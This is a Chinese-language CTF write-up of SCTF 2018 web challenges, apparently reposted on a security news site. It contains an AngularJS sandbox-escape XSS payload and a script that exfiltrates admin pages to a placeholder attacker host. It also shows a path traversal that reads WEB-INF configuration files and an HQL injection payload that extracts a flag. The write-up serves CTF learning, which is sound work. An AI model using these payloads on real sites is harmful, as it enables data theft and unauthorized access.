# SCTF 2018 web部分writeup

阅读量 **205961**

|评论 **2**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2018-06-26 11:20:48

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p3.ssl.qhimg.com/t01f2fe2f5217507f5e.jpg)

NU1L师傅写的wp有点糙，虽然这个比赛web狗饱受打击，我就抓紧时间复现了下，学到了不少东西.

## Web

###  新的建议板

师傅最近开始学前端 想写个建议板 后来失败了？  
登录上题，注册了一个账号，直接查看js模板  

    
    
    直接在前端的min-test.js
    angular.module("mintest",["ngRoute"]).controller("IndexController",function($scope,$route)
    {$scope.$route=$route}).config(function($routeProvider)
    {$routeProvider.when("/admintest2313",
    {templateUrl:"view/admintest2313.html",controller:"IndexController"}).when("/home",
    {templateUrl:"view/home.html",controller:"IndexController"}).when("/login",
    {templateUrl:"view/login.html",controller:"IndexController"}).when("/loginout",
    {templateUrl:"view/loginout.html",controller:"IndexController"}).when("/register",
    {templateUrl:"view/register.html",controller:"IndexController"}).when("/suggest",
    {templateUrl:"view/suggest.html",controller:"IndexController"})});
    

直接可以到后台路径，尝试访问view/admintest2313.html，查看源代码 可以直接看到后台程序的接口

    
    
    /api/memos/admintest2313
    

直接可以在这里看到使用的AngularJS模板，直接查找相应的模板漏洞

    
    
    {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}
    

然后直接利用xss反弹到自己的服务器上，看看能获取什么

    
    
    {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };window.open("你的ip")//');}}
    

![](https://upload-images.jianshu.io/upload_images/9172841-9797fb51e9f49063.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

    
    
    {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };eval(atob('$.getScript('http://xxxxxxxxxxxxx/xss1.js');'))//');}}
    
    
    
    xss.js
    $.ajax({
        url: "/admin",
        type: "GET",
        dataType: "text",
        success: function(result) {
            var code = btoa(encodeURIComponent(result));
            xssPost('http://xxxxxxxxxxxxxxxx', code);
        },
        error: function(msg) {
    
        }
    })
    
    function xssPost(url, postStr) {
        var de;
        de = document.body.appendChild(document.createElement('iframe'));
        de.src = 'about:blank';
        de.height = 1;
        de.width = 1;
        de.contentDocument.write('<form method="POST" action="' + url + '"><input name="code" value="' + postStr + '"/></form>');
        de.contentDocument.forms[0].submit();
        de.style.display = 'none';
    }
    

把那一堆base64解密

    
    
    <!DOCTYPE html>
    <html lang="zh-CN">
      <head>
        <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <!-- 上述3个meta标签*必须*放在最前面，任何其他内容都*必须*跟随其后！ -->
        <meta name="description" content="">
        <meta name="author" content="">
        <link rel="icon" href="">
    
        <title>SYC</title>
    
    
        <link href="https://cdn.bootcss.com/bootstrap/3.3.7/css/bootstrap.min.css" rel="stylesheet">
        <link href="css/ie10-viewport-bug-workaround.css" rel="stylesheet">
        <link href="css/starter-template.css" rel="stylesheet">
        <style type="text/css">
              body {
                padding-top: 60px;
                padding-bottom: 40px;
              }
            </style>
    
        <script src="https://cdn.bootcss.com/angular.js/1.4.6/angular.min.js"></script>
        <script src="https://apps.bdimg.com/libs/angular-route/1.3.13/angular-route.js"></script>
        <script src="js/ie-emulation-modes-warning.js"></script>
    
      </head>
    
      <body >
    
        <nav class="navbar navbar-inverse navbar-fixed-top">
          <div class="container">
            <div class="navbar-header">
              <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar">
                <span class="sr-only">Toggle navigation</span>
                <span class="icon-bar"></span>
                <span class="icon-bar"></span>
                <span class="icon-bar"></span>
              </button>
              <a class="navbar-brand" href="/">SYC ADMIN</a>
            </div>
            <div id="navbar" class="collapse navbar-collapse">
              <ul class="nav navbar-nav">
                <li class="active"><a href="#">Home</a></li>
                <li><a href="#">日志</a></li>
                <li><a href="#">账单</a></li>
                <li><a href="admin/file">文件</a></li>
                <li><a href="admin/suggest">留言</a></li>
                <li><a href="#">发布</a></li>
              </ul>
            </div>
          </div>
        </nav>
    
    
    <div class="container">
      <div class="jumbotron">
            <h1>HELLO adminClound</h1>
            <p>新版后台2.0!</p>
      </div>
    </div>
    
    
        <!-- Bootstrap core JavaScript
    ================================================== -->
    <!-- Placed at the end of the document so the pages load faster -->
    <script src="https://cdn.bootcss.com/jquery/1.12.4/jquery.min.js"></script>
    <script src="https://cdn.bootcss.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
    <!-- IE10 viewport hack for Surface/desktop Windows 8 bug -->
    <script src="js/ie10-viewport-bug-workaround.js"></script>
    
    </body>
    </html>
    

这里可以获得用户名adminClound  
尝试访问/api/memos/adminClound得到如下信息

    
    
    [{"memo":"文件密码：HGf^&39NsslUIf^23"},{"memo":"规定完成时间：6月30日"},{"memo":"项目完成删除备忘录功能"}]
    

修改js文件继续访问这两个路径(改url)

    
    
    /admin/file
    
    <div class="container">
      <form method="post">
        <label for="filePasswd" class="sr-only">输入文件密码</label>
        <input type="text" id="filePasswd" class="form-control" placeholder="filepasswd" required="" autofocus="" name="filepasswd">
        <button class="btn btn-lg btn-primary btn-block" type="submit">提交</button>
      </form>
    </div>
    
    <!-- Bootstrap core JavaScript
    ================================================== -->
    <!-- Placed at the end of the document so the pages load faster -->
    <script src="https://cdn.bootcss.com/jquery/1.12.4/jquery.min.js"></script>
    <script src="https://cdn.bootcss.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
    <!-- IE10 viewport hack for Surface/desktop Windows 8 bug -->
    <script src="js/ie10-viewport-bug-workaround.js"></script>
    
    </body>
    </html>
    
    
    
    admin/suggest
    
    <div class="container">
      <h3>留言</h3>
      <div ng-app>
      <ol>
      <li></li>
      </ol>
    </div>
    </div>
    
      <!-- Bootstrap core JavaScript
    ================================================== -->
    <!-- Placed at the end of the document so the pages load faster -->
    <script src="https://cdn.bootcss.com/jquery/1.12.4/jquery.min.js"></script>
    <script src="https://cdn.bootcss.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
    <!-- IE10 viewport hack for Surface/desktop Windows 8 bug -->
    <script src="js/ie10-viewport-bug-workaround.js"></script>
    
    </body>
    </html>
    

接下来东西都有了，直接访问加密的那个文件/admin/file

    
    
    {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };eval(atob("$.post('/admin/file',{'filepasswd':'HGf^&39NsslUIf^23'},function(data){(new Image()).src="你的ip/?info="+escape(data);});"));//');}}
    

###  Zhuanxv

你只是在扫描目标端口的时候发现了一个开放的web服务

  
扫描一波目录，可以扫到list，然后访问可以抓到怎么一个包  
猜测可能是文件读取

同时在github上可以找到源码，有用的信息如下

![](https://upload-images.jianshu.io/upload_images/9172841-465d42df9aacd5b6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

初始用户名是:homamamama 不过密码改了,拿弱口令字典可以爆出来密码是6yhn7ujm

然后在访问list目录，然后什么都没有发生…….

然后可以看到这个是java写的应用，构造路径直接读取一下web.xml

![](https://upload-images.jianshu.io/upload_images/9172841-88753feb02c3351c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

直接在github上找框架

    
    
    https://github.com/martin-wong/iCloud
    

  
  
然后直接构造路径读取文件

    
    
    配置文件
    HTTP/1.1 200 
    Content-Disposition: attachment;filename="bg.jpg"
    Content-Type: image/jpeg
    Date: Fri, 22 Jun 2018 03:51:44 GMT
    Connection: close
    Content-Length: 2243
    
    <?xml version="1.0" encoding="UTF-8"?>
    
    <!DOCTYPE struts PUBLIC
            "-//Apache Software Foundation//DTD Struts Configuration 2.3//EN"
            "http://struts.apache.org/dtds/struts-2.3.dtd">
    <struts>
        <constant name="strutsenableDynamicMethodInvocation" value="false"/>
        <constant name="struts.mapper.alwaysSelectFullNamespace" value="true" />
        <constant name="struts.action.extension" value=","/>
        <package name="front" namespace="/" extends="struts-default">
            <global-exception-mappings>
                <exception-mapping exception="java.lang.Exception" result="error"/>
            </global-exception-mappings>
            <action name="zhuanxvlogin" class="com.cuitctf.action.UserLoginAction" method="execute">
                <result name="error">/ctfpage/login.jsp</result>
                <result name="success">/ctfpage/welcome.jsp</result>
            </action>
            <action name="loadimage" class="com.cuitctf.action.DownloadAction">
                <result name="success" type="stream">
                    <param name="contentType">image/jpeg</param>
                    <param name="contentDisposition">attachment;filename="bg.jpg"</param>
                    <param name="inputName">downloadFile</param>
                </result>
                <result name="suffix_error">/ctfpage/welcome.jsp</result>
            </action>
        </package>
        <package name="back" namespace="/" extends="struts-default">
            <interceptors>
                <interceptor name="oa" class="com.cuitctf.util.UserOAuth"/>
                <interceptor-stack name="userAuth">
                    <interceptor-ref name="defaultStack" />
                    <interceptor-ref name="oa" />
                </interceptor-stack>
    
            </interceptors>
            <action name="list" class="com.cuitctf.action.AdminAction" method="execute">
                <interceptor-ref name="userAuth">
                    <param name="excludeMethods">
                        execute
                    </param>
                </interceptor-ref>
                <result name="login_error">/ctfpage/login.jsp</result>
                <result name="list_error">/ctfpage/welcome.jsp</result>
                <result name="success">/ctfpage/welcome.jsp</result>
            </action>
        </package>
    </struts>
    

然后根据这个逐个的吧文件读取下来  
最后可以发现在../../WEB-INF/classes/applicationContext.xml中

    
    
    <?xml version="1.0" encoding="UTF-8"?>
    <beans xmlns="http://www.springframework.org/schema/beans"
           xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
           xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
        <bean id="dataSource" class="org.springframework.jdbc.datasource.DriverManagerDataSource">
            <property name="driverClassName">
                <value>com.mysql.jdbc.Driver</value>
            </property>
            <property name="url">
                <value>jdbc:mysql://localhost:3306/sctf</value>
            </property>
            <property name="username" value="root"/>
            <property name="password" value="root" />
        </bean>
        <bean id="sessionFactory" class="org.springframework.orm.hibernate3.LocalSessionFactoryBean">
            <property name="dataSource">
                <ref bean="dataSource"/>
            </property>
            <property name="mappingLocations">
                <value>user.hbm.xml</value>
            </property>
            <property name="hibernateProperties">
                <props>
                    <prop key="hibernate.dialect">org.hibernate.dialect.MySQLDialect</prop>
                    <prop key="hibernate.show_sql">true</prop>
                </props>
            </property>
        </bean>
        <bean id="hibernateTemplate" class="org.springframework.orm.hibernate3.HibernateTemplate">
            <property name="sessionFactory">
                <ref bean="sessionFactory"/>
            </property>
        </bean>
        <bean id="transactionManager" class="org.springframework.orm.hibernate3.HibernateTransactionManager">
            <property name="sessionFactory">
                <ref bean="sessionFactory"/>
            </property>
        </bean>
        <bean id="service" class="org.springframework.transaction.interceptor.TransactionProxyFactoryBean" abstract="true">
            <property name="transactionManager">
                <ref bean="transactionManager"/>
            </property>
            <property name="transactionAttributes">
                <props>
                    <prop key="add">PROPAGATION_REQUIRED</prop>
                    <prop key="find*">PROPAGATION_REQUIRED,readOnly</prop>
                </props>
            </property>
        </bean>
        <bean id="userDAO" class="com.cuitctf.dao.impl.UserDaoImpl">
            <property name="hibernateTemplate">
                <ref bean="hibernateTemplate"/>
            </property>
        </bean>
        <bean id="userService" class="com.cuitctf.service.impl.UserServiceImpl">
            <property name="userDao">
                <ref bean="userDAO"/>
            </property>
        </bean>
    </beans>
    

可以看到是用hibernate执行sql  
而且flag在数据库中，就需要读取数据库  
顺便读取一下../../WEB-INF/classes/user.hbm.xml

    
    
    <?xml version="1.0"?>
    <!DOCTYPE hibernate-mapping PUBLIC
            "-//Hibernate/Hibernate Mapping DTD 3.0//EN"
            "http://hibernate.sourceforge.net/hibernate-mapping-3.0.dtd">
    <hibernate-mapping package="com.cuitctf.po">
        <class name="User" table="hlj_members">
            <id name="id" column="user_id">
                <generator class="identity"/>
            </id>
            <property name="name"/>
            <property name="password"/>
        </class>
        <class name="Flag" table="bc3fa8be0db46a3610db3ca0ec794c0b">
            <id name="flag" column="welcometoourctf">
                <generator class="identity"/>
            </id>
            <property name="flag"/>
        </class>
    </hibernate-mapping>
    

然后在将applicationContext.xml中相应的class反编译，查看过滤条件  
这里只贴出关键代码

    
    
        //UserLoginAction.class
    
        public boolean userCheck(User user) {
            List < User > userList = this.userService.loginCheck(user.getName(), user.getPassword());
            if ((userList != null) && (userList.size() == 1)) {
                return true;
            }
            addActionError("Username or password is Wrong, please check!");
            return false;
        }
    
        //UserServiceImpl.class
    
        public List <User> loginCheck(String name, String password) {
            name = name.replaceAll(" ", "");
            name = name.replaceAll("=", "");
            Matcher username_matcher = Pattern.compile("^[0-9a-zA-Z]+$").matcher(name);
            Matcher password_matcher = Pattern.compile("^[0-9a-zA-Z]+$").matcher(password);
            if (password_matcher.find()) {
                return this.userDao.loginCheck(name, password);
            }
            return null;
        }
    
        //UserDaoImpl.class
    
        public List < User > loginCheck(String name, String password) {
            return getHibernateTemplate().find("from User where name ='" + name + "' and password = '" + password + "'");  
        }
    

剩下的就是注入了，需要符合Hsql语法规则  
最后的payload

    
    
    user.name=1'or(from Flag)like'sctf{%25'or''like'&user.password=aaaa
    

###  easiest web – phpmyadmin

直接看这个  
<https://www.jianshu.com/p/f51b6e54d613>

其他的题我目前的能力还不足以达到，还需努力……

## 参考

<http://www.venenof.com/index.php/archives/551/>  
<http://sec2hack.com/ctf/sctf2018-web-writeup.html>  
在膜一波W&P和NU1L的师傅们

审核人：yiwang 编辑：少爷

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **theKingOfNight** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/149324](/post/id/149324)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [Web](/tag/Web)
  * [writeup](/tag/writeup)
  * [SCTF 2018](/tag/SCTF 2018)

 **+1** __1赞

 __收藏

![](https://p5.ssl.qhimg.com/t017ac915f0736fc7ac.png) theKingOfNight

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

